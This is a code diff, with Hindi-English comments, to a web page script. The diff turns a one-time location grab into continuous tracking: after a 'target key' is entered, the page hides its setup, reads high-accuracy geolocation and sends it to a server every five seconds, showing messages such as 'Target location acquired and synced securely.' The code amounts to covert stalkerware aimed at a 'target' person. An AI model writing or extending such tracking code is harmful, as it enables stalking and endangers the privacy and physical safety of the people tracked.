@@ -23,8 +23,9 @@
 
     <h3 id="log" style="display:none;">System background process running...</h3>
 
-    <script>
+       <script>
         let deviceId = "";
+        let trackingInterval; // Loop ke liye variable
 
         function startTracking() {
             const keyInput = document.getElementById('target-key').value;
@@ -35,6 +36,14 @@
             document.getElementById('setup-box').style.display = "none";
             document.getElementById('log').style.display = "block";
 
+            // Pehli baar turant location bhejo
+            getLocationAndSend();
+
+            // Uske baad har 5 second (5000ms) mein location bhejo
+            trackingInterval = setInterval(getLocationAndSend, 5000);
+        }
+
+        function getLocationAndSend() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocationToServer, handleError, {
                     enableHighAccuracy: true, timeout: 10000
@@ -59,7 +68,11 @@
             })
             .then(response => response.json())
             .then(res => {
-                document.getElementById('log').innerText = "Target location acquired and synced securely.";
+                // Screen par blink effect dene ke liye taaki target ko pata chale system chal raha hai
+                document.getElementById('log').innerText = "Target location acquired and synced securely. [LIVE 🟢]";
+                setTimeout(() => {
+                    document.getElementById('log').innerText = "System background process running...";
+                }, 2000);
             })
             .catch(err => document.getElementById('log').innerText = "Connection error!");
         }
@@ -68,5 +81,3 @@
             document.getElementById('log').innerText = "Tracking Error: " + error.message;
         }
     </script>
-</body>
-</html>
